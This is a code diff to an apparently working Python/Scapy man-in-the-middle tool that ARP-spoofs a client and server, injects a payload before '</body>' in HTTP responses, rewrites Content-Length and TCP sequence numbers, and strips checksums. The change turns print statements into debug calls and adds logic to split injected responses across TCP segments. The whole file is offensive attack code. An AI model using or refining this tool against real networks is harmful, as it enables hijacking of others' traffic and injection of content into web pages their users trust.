@@ -68,7 +68,7 @@ def interceptor(packet):
 
 
 def cRequestS(packet):
-	global serverMAC, attackerMAC, portLength, resetPort, multiRes, clientExpSA, serverExpSA
+	global serverMAC, attackerMAC, portLength, resetPort, clientExpSA, serverExpSA
 	
 	oriAck = 0
 	if packet.haslayer(TCP):
@@ -114,22 +114,22 @@ def cRequestS(packet):
 				multiRes.pop(packet[TCP].sport)
 		
 		if packet[TCP].flags != "FA":
-			print("# Request")
+			debug("# Request")
 		else:
-			print("# Finish")
-		print(f"\tflags: {packet[TCP].flags}")
-		print(f"\tsrc: {packet[TCP].sport}")
-		print(f"\tseq: {packet[TCP].seq}")
-		print(f"\told ack: {oriAck}")
-		print(f"\tnew ack: {packet[TCP].ack}")
+			debug("# Finish")
+		debug(f"\tflags: {packet[TCP].flags}")
+		debug(f"\tsrc: {packet[TCP].sport}")
+		debug(f"\tseq: {packet[TCP].seq}")
+		debug(f"\told ack: {oriAck}")
+		debug(f"\tnew ack: {packet[TCP].ack}")
 		if packet[TCP].sport in portLength:
-			print(f"\tportLength {packet[TCP].sport}:{portLength[packet[TCP].sport]}")
+			debug(f"\tportLength {packet[TCP].sport}:{portLength[packet[TCP].sport]}")
 		if packet[TCP].sport in multiRes:
-			print(f"\tmultiRes {packet[TCP].sport}:{multiRes[packet[TCP].sport]}")
+			debug(f"\tmultiRes {packet[TCP].sport}:{multiRes[packet[TCP].sport]}")
 		if packet[TCP].sport in clientExpSA:
-			print(f"\tclientExpSA {packet[TCP].sport}:{clientExpSA[packet[TCP].sport]}")
+			debug(f"\tclientExpSA {packet[TCP].sport}:{clientExpSA[packet[TCP].sport]}")
 		if packet[TCP].sport in serverExpSA:
-			print(f"\tserverExpSA {packet[TCP].sport}:{serverExpSA[packet[TCP].sport]}")
+			debug(f"\tserverExpSA {packet[TCP].sport}:{serverExpSA[packet[TCP].sport]}")
 		
 		# Delete checksum to make hosts do not check integrity.
 		del packet[IP].len
@@ -146,7 +146,7 @@ def cRequestS(packet):
 
 
 def sResponseC(packet):
-	global clientMAC, attackerMAC, payload, portLength, resetPort, multiRes, clientExpSA, serverExpSA
+	global clientMAC, attackerMAC, payload, resetPort, multiRes, clientExpSA, serverExpSA, partPayload
 	
 	oriSeq = 0
 	httpLoad = 0
@@ -155,7 +155,6 @@ def sResponseC(packet):
 	if packet.haslayer(Raw):
 		# Add payload.
 		httpLoad = packet[Raw].load.decode('utf-8')
-		print(httpLoad)
 		oriHttpLen = len(httpLoad)
 		httpLoad = httpLoad.replace('</body>', payload + '</body>')
 		
@@ -169,7 +168,14 @@ def sResponseC(packet):
 			httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
 		except:
 			pass
+		if packet[TCP].dport in partPayload:
+			httpLoad = partPayload[packet[TCP].dport] + httpLoad
+			partPayload.pop(packet[TCP].dport)
 		packet[Raw].load = httpLoad.encode('utf-8')
+		tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4
+		if tcpLoad > 1448:
+			packet[Raw].load = httpLoad[:-(tcpLoad - 1448)].encode('utf-8')
+			partPayload[packet[TCP].dport] = httpLoad[-(tcpLoad - 1448):]
 	
 	# If TCP flag is FA, raise a flag so that
 	# we can close connection when receiving ack from client.
@@ -177,7 +183,6 @@ def sResponseC(packet):
 	if packet.haslayer(TCP):
 		if packet[TCP].flags == "FA":
 			resetPort[packet[TCP].dport] = True
-		
 		
 		if packet[TCP].flags != "SA":
 			if packet.haslayer(Raw):
@@ -208,7 +213,6 @@ def sResponseC(packet):
 						if packet.haslayer(Raw):
 							if (packet[TCP].seq - pair[0]) > (len(httpLoad) - oriHttpLen):
 								diff = pair[0] - multiRes[packet[TCP].dport]
-								print(diff)
 								packet[TCP].seq = packet[TCP].seq + diff
 							else:
 								packet[TCP].seq = pair[0]
@@ -236,20 +240,20 @@ def sResponseC(packet):
 		del packet[IP].len
 		del packet[IP].chksum
 		del packet[TCP].chksum
-		print("# Response")
-		print(f"\tflags: {packet[TCP].flags}")
-		print(f"\tdst: {packet[TCP].dport}")
-		print(f"\told seq: {oriSeq}")
-		print(f"\tnew seq: {packet[TCP].seq}")
-		print(f"\tack: {packet[TCP].ack}")
+		debug("# Response")
+		debug(f"\tflags: {packet[TCP].flags}")
+		debug(f"\tdst: {packet[TCP].dport}")
+		debug(f"\told seq: {oriSeq}")
+		debug(f"\tnew seq: {packet[TCP].seq}")
+		debug(f"\tack: {packet[TCP].ack}")
 	if packet[TCP].dport in portLength:
-		print(f"\tportLength {packet[TCP].dport}:{portLength[packet[TCP].dport]}")
+		debug(f"\tportLength {packet[TCP].dport}:{portLength[packet[TCP].dport]}")
 	if packet[TCP].dport in multiRes:
-		print(f"\tmultiRes {packet[TCP].dport}:{multiRes[packet[TCP].dport]}")
+		debug(f"\tmultiRes {packet[TCP].dport}:{multiRes[packet[TCP].dport]}")
 	if packet[TCP].dport in clientExpSA:
-		print(f"\tclientExpSA {packet[TCP].dport}:{clientExpSA[packet[TCP].dport]}")
+		debug(f"\tclientExpSA {packet[TCP].dport}:{clientExpSA[packet[TCP].dport]}")
 	if packet[TCP].dport in serverExpSA:
-		print(f"\tserverExpSA {packet[TCP].dport}:{serverExpSA[packet[TCP].dport]}")
+		debug(f"\tserverExpSA {packet[TCP].dport}:{serverExpSA[packet[TCP].dport]}")
 	
 	# Change MAC src and dst, then fragment packets.
 	packet[Ether].src = attackerMAC
@@ -292,6 +296,7 @@ if __name__ == "__main__":
 	
 	clientExpSA = {}
 	serverExpSA = {}
+	partPayload = {}
 
 	# start a new thread to ARP spoof in a loop
 	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
